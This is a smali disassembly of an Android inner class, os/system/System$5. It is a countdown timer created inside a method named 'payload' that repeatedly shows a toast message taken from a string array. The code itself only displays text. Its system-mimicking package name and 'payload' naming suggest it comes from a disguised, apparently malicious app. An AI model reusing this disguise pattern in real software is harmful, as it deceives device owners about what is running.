.class Los/system/System$5;
.super Landroid/os/CountDownTimer;
.source "System.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Los/system/System;->payload(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Los/system/System;

.field final synthetic val$context:Landroid/content/Context;

.field final synthetic val$text:[Ljava/lang/String;


# direct methods
.method constructor <init>(Los/system/System;JJLandroid/content/Context;[Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 486
    iput-object p1, p0, Los/system/System$5;->this$0:Los/system/System;

    iput-object p6, p0, Los/system/System$5;->val$context:Landroid/content/Context;

    iput-object p7, p0, Los/system/System$5;->val$text:[Ljava/lang/String;

    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 0

    .prologue
    .line 493
    return-void
.end method

.method public onTick(J)V
    .locals 5

    .prologue
    .line 488
    iget-object v0, p0, Los/system/System$5;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v1, p0, Los/system/System$5;->val$context:Landroid/content/Context;

    iget-object v2, p0, Los/system/System$5;->val$text:[Ljava/lang/String;

    const/4 v3, 0x1

    aget-object v2, v2, v3

    invoke-static {}, Los/system/System;->access$1300()I

    move-result v3

    invoke-static {}, Los/system/System;->access$1200()I

    move-result v4

    invoke-virtual {v0, v1, v2, v3, v4}, Los/system/ReceiverBoot;->toastText(Landroid/content/Context;Ljava/lang/String;II)V

    .line 489
    iget-object v0, p0, Los/system/System$5;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v0, v0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 490
    return-void
.end method
